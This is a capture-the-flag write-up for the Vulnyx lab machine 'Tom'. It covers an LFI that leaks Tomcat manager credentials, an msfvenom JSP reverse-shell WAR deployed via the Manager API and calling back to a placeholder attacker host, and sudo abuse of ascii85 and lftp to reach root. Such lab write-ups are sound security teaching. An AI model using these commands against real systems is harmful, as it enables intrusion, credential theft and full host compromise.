# Vulnyx: Tom

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `msfvenom` · `curl` · `nc` |
| **Tags** | `#LFI` `#Tomcat` `#WARDeploy` `#RCE` `#SudoAbuse` `#ascii85` `#lftp` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

An LFI in `tomcat.php` — a file reader, ironically enough on a Tomcat box — reads Tomcat's own systemd unit to find its install path, then `tomcat-users.xml`, leaking manager credentials directly. Those deploy a malicious `.war` through Tomcat Manager's API for RCE. A `sudo` rule around `ascii85`, run as another user and piped straight back into a decode, dumps that user's private SSH key. A final `sudo` rule around `lftp` reaches root through its shell-escape feature.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn tom.nyx

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 08:00:27:94:84:49 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **8080**. A version/script scan against all three fills in the details — 8080 is Tomcat 9.0.54, the box's namesake:

```bash
$ sudo nmap -p 22,80,8080 -sCV tom.nyx

PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 55:5f:3f:15:c7:cb:5f:09:d6:a1:f5:70:06:d0:dd:bc (RSA)
|   256 ec:db:41:19:b8:60:bc:53:6f:c7:ef:c6:d3:ee:b9:b8 (ECDSA)
|_  256 2e:0d:03:27:a5:2a:0b:4e:b0:6a:42:01:57:fd:a9:9f (ED25519)
80/tcp   open   http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
8080/tcp open   http     Apache Tomcat (language: es)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.54
|_http-favicon: Apache Tomcat
MAC Address: 08:00:27:94:84:49 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://tom.nyx/
http://tom.nyx:8080/
```

<img src="../Images/tom/Pasted image 20260530162054.png"/>
<img src="../Images/tom/Pasted image 20260530162108.png"/>

A content scan of the Apache site on 80 surfaces a `tomcat.php` — a 0-byte response on its own, which usually means it needs a parameter to do anything:

```bash
$ ffuf -u http://tom.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html      [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 144ms]
javascript      [Status: 301, Size: 307,   Words: 20,   Lines: 10,  Duration: 0ms]
tomcat.php      [Status: 200, Size: 0,     Words: 1,    Lines: 1,   Duration: 68ms]
server-status   [Status: 403, Size: 272,   Words: 20,   Lines: 10,  Duration: 4ms]
```

> **Endpoint:** `/tomcat.php`

### LFI Discovery

Since `tomcat.php` returns nothing without input, its parameter name is fuzzed — feeding `/etc/passwd` as the value and looking for the response that suddenly has content. The working parameter is `filez`:

```bash
$ ffuf -u http://tom.nyx/tomcat.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0

filez           [Status: 200, Size: 1441, Words: 13, Lines: 28, Duration: 17ms]
```

Confirmed directly (`view-source:` so the browser shows the raw file rather than rendering it):

```
view-source:http://tom.nyx/tomcat.php?filez=/etc/passwd
```

<img src="../Images/tom/Pasted image 20260530162108.png"/>

## Initial Access

### Loot: Tomcat Manager Credentials via LFI

The LFI reads any file the web user can access — but the manager password lives in `tomcat-users.xml`, and that file's location depends on where Tomcat is installed. So the systemd unit is read first to learn the install path:

```
view-source:http://tom.nyx/tomcat.php?filez=/etc/systemd/system/tomcat.service
```

<img src="../Images/tom/Pasted image 20260530162225.png"/>

With the install path known (`/opt/tomcat/latest`), `tomcat-users.xml` is read straight from it — and it holds the manager credentials in plaintext:

```
view-source:http://tom.nyx/tomcat.php?filez=/opt/tomcat/latest/conf/tomcat-users.xml
```

<img src="../Images/tom/Pasted image 20260530162258.png"/>

> **Credentials:** `tomcat:t0mL1k3$c4t$!!!`

### RCE via Tomcat Manager WAR Deploy

Tomcat Manager's deploy API is remote code execution by design for anyone with valid manager credentials: a `.war` is a Java web app, so a `.war` containing a JSP shell runs as the Tomcat process once deployed. `msfvenom` builds one that calls back on connect:

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war -o rev_shell.war
Payload size: 1102 bytes
Final size of war file: 1102 bytes
Saved as: rev_shell.war
```

The text API accepts the upload directly, authenticated with the recovered credentials, and browsing the deployed context path triggers the shell:

```bash
$ curl --upload-file rev_shell.war -u 'tomcat:t0mL1k3$c4t$!!!' 'http://tom.nyx:8080/manager/text/deploy?path=/rev_shell'
OK - Desplegada aplicación en trayectoria de contexto [/rev_shell]

$ curl http://tom.nyx:8080/rev_shell/
```

### Shell as tomcat

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [tom.nyx] 38290
id
uid=1001(tomcat) gid=1001(tomcat) grupos=1001(tomcat)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Escalating to nathan via `ascii85`

```bash
tomcat@tom:/$ sudo -l
Matching Defaults entries for tomcat on tom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User tomcat may run the following commands on tom:
    (nathan) NOPASSWD: /usr/bin/ascii85
```

> **GTFOBins:** `https://gtfobins.github.io/gtfobins/ascii85/`

`ascii85` just encodes and decodes files in the Ascii85 format — but `tomcat` can run it as `nathan`, which means the *encode* step reads a file with `nathan`'s permissions. Ascii85 is fully reversible, so piping that privileged encode straight into an ordinary (unprivileged) decode reconstructs the original file: `nathan`'s private SSH key is read without `tomcat` ever having permission to open it directly, and without writing an intermediate encoded copy to disk:

```bash
tomcat@tom:/$ LFILE=/home/nathan/.ssh/id_rsa
tomcat@tom:/$ sudo -u nathan /usr/bin/ascii85 "$LFILE" | /usr/bin/ascii85 --decode
```

<img src="../Images/tom/Pasted image 20260530162454.png"/>

The recovered key is saved locally, permissions tightened, and used to log in as `nathan`:

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa nathan@tom.nyx
nathan@tom:~$ id
uid=1000(nathan) gid=1000(nathan) grupos=1000(nathan)
nathan@tom:~$ cat /home/nathan/user.txt
a9cdb9e26d1c627f008ae9c53385d146
```

> **User flag:** `a9cdb9e26d1c627f008ae9c53385d146`

## Privilege Escalation

### Shell Escape in `lftp`

```bash
nathan@tom:~$ sudo -l
Matching Defaults entries for nathan on tom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User nathan may run the following commands on tom:
    (root) NOPASSWD: /usr/bin/lftp
```

> **GTFOBins:** `https://gtfobins.github.io/gtfobins/lftp/`

`nathan` can run `lftp` — an FTP/file-transfer client — as root. Its `-c` flag runs an lftp command, and a leading `!` sends the rest to the local shell instead of the lftp interpreter. Run as root via `sudo`, that shell is root:

```bash
nathan@tom:~$ sudo /usr/bin/lftp -c '!/bin/bash'
```

```bash
root@tom:/home/nathan# id
uid=0(root) gid=0(root) grupos=0(root)
root@tom:/home/nathan# cat /root/root.txt
a2780681529284ec485c2d0e0a7f6831
```

> **Root flag:** `a2780681529284ec485c2d0e0a7f6831`

## Takeaways

- Application configuration and service-unit files are a common LFI target beyond `/etc/passwd` — reading the systemd unit first to learn Tomcat's install path, then `tomcat-users.xml` from it, handed over manager credentials directly.
- Tomcat Manager's deploy API is remote code execution by design for anyone with valid manager credentials — a JSP shell packed into a `.war` runs as the Tomcat process the moment it's deployed, no separate vulnerability needed.
- Piping a privileged encode into an unprivileged decode of the same format is a neat, generalizable file-read trick whenever a `sudo` rule allows running an encoding or compression tool as another user — the round trip through `sudo` is what leaks the content, with nothing written to disk.
- Any interactive tool with a shell-escape (`lftp`'s `!` here) becomes a root shell the instant it's allowed under `sudo` as root — the tool's actual purpose is irrelevant.